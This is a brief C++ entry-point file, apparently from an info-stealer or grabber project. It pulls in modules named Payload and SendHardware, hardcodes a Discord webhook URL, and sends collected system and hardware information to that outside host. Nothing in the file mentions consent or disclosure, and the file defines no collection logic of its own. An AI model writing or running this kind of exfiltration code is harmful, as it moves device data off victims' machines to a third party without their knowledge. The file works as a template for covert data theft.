#include <iostream>
#include "Module/Logger.hpp"
#include "Extension/Payload/Payload.hpp"
#include "Extension/GetDevice/Hardware.hpp"
#include "Extension/GetDevice/SendHardware.hpp"

int main() {
    try {
        const std::string webhook_url = "https://discord.com/api/webhooks/1305572985557483531/jChiiJTkJO3-TzMCofXOHukxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxq";

        // Log starting
        LOG_INFO("Starting system information collection...");

        // Send system information to Discord
        if (SendHardware::SendSystemInfo(webhook_url)) {
            LOG_INFO("Successfully sent system information to Discord!");
        }
        else {
            LOG_EXPECTION("Failed to send system information to Discord!");
        }
    }
    catch (const std::exception& e) {
        LOG_EXPECTION(e.what());
    }

    return 0;
}